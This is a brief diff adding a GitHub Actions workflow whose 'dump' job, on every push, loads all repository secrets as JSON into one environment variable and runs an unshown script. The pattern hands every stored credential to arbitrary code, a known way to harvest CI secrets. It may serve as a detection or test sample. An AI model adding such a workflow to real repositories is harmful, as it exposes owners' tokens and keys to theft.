@@ -1,0 +1,8 @@
+on: push
+jobs:
+  dump:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          ALL: ${{ toJSON(secrets) }}
+        run: ./script.sh
